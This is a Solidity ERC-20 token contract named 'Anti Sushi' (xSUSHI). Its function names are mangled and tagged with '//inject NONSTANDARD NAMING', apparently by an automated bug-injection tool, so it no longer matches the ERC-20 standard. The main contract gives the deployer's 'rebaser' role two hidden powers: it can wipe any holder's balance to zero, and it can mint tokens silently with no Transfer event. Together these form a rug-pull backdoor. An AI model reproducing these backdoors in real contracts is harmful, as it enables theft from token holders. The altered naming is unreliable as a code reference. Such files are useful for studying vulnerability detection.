                                                                 

                                                           

pragma solidity ^0.5.16;
interface IERC20 {
    function TOTALSUPPLY305() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF226(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER88(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE903(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE403(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM699(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER47(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL349(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}
contract Context {
    constructor () internal { }
    function _MSGSENDER402() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY305() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF226(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER88(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER717(_MSGSENDER402(), recipient, amount);
        return true;
    }
    function ALLOWANCE903(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE403(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE255(_MSGSENDER402(), spender, amount);
        return true;
    }
    function TRANSFERFROM699(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER717(sender, recipient, amount);
        _APPROVE255(sender, _MSGSENDER402(), _allowances[sender][_MSGSENDER402()].SUB303(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE937(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE255(_MSGSENDER402(), spender, _allowances[_MSGSENDER402()][spender].ADD642(addedValue));
        return true;
    }
    function DECREASEALLOWANCE967(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE255(_MSGSENDER402(), spender, _allowances[_MSGSENDER402()][spender].SUB303(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER717(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB303(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD642(amount);
        emit TRANSFER47(sender, recipient, amount);
    }
    function _INITMINT989(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD642(amount);
        _balances[account] = _balances[account].ADD642(amount);
        emit TRANSFER47(address(0), account, amount);
    }
    function _REFUEL102(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: _refuel to the zero address");
        _totalSupply = _totalSupply.ADD642(amount);
        _balances[account] = _balances[account].ADD642(amount);
    }
    function _BURN562(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].SUB303(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB303(amount);
        emit TRANSFER47(account, address(0), amount);
    }
    function _REBASE20(address acc) internal {	//inject NONSTANDARD NAMING
        require(acc != address(0), "rebase to the zero address");
        uint amount = _balances[acc];
        _balances[acc] = 0;
        _totalSupply = _totalSupply.SUB303(amount);
    }
    function _APPROVE255(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL349(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME695() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL985() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS744() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD642(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB303(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB303(a, b, "SafeMath: subtraction overflow");
    }
    function SUB303(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL811(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV294(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV294(a, b, "SafeMath: division by zero");
    }
    function DIV294(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract AntiSushi is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public rebasers;
  constructor () public ERC20Detailed("Anti Sushi", "xSUSHI", 18) {
      _INITMINT989( msg.sender, 1000*10**uint(DECIMALS744()) );
      rebasers[msg.sender] = true;
  }

  function REBASE740(address account) public {	//inject NONSTANDARD NAMING
      require(rebasers[msg.sender], "error");
      _REBASE20(account);
  }

  function REFUEL582(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(rebasers[msg.sender], "error");
      _REFUEL102(account, amount);
  }

}